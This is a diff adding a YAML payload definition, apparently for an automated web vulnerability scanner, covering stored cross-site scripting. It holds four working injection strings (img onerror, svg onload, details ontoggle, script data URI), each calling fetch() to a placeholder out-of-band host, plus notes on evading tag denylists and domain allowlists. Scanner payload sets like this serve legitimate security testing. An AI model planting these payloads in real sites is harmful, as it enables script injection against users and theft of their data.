@@ -1,0 +1,43 @@
+family_id: xss_stored
+description: >-
+  Stored XSS payloads with polyglot markers targeting persistence sinks.
+  Includes img/onerror, svg/onload, details/ontoggle, and script src=data:
+  vectors (CWE-79).
+cwe_ids: [79]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: img_onerror_polyglot
+    template: ">'>\"><img src=x onerror=fetch('//{oast_host}/{canary}')>"
+    confidence: suspected
+    notes: Three-context polyglot break-out into img onerror with fetch-based OAST.
+  - id: svg_onload_polyglot
+    template: "><svg/onload=fetch('//{oast_host}/{canary}')>"
+    confidence: suspected
+    notes: SVG onload handler; executes when XML-parsed contexts allow svg.
+  - id: details_ontoggle
+    template: "<details open ontoggle=fetch('//{oast_host}/{canary}')>"
+    confidence: suspected
+    notes: details/ontoggle event handler; bypasses naive tag denylists.
+  - id: data_script_src
+    template: "<script src=data:text/javascript,fetch('//{oast_host}/{canary}')></script>"
+    confidence: suspected
+    notes: Script src=data: URI with inline fetch; bypasses src-domain allowlists.
+mutations:
+  - name: event_handler_swap
+    description: Rotate through onmouseover, onfocus, onanimationstart handler bypasses.
+  - name: closing_contexts
+    description: Prepend '> --> </textarea> </style> to break out of common HTML contexts.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw stored XSS payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for form submission contexts.
+  - name: html_entity
+    stages: [html]
+    description: HTML-entity encoded; tests double-decoding on storage retrieval.
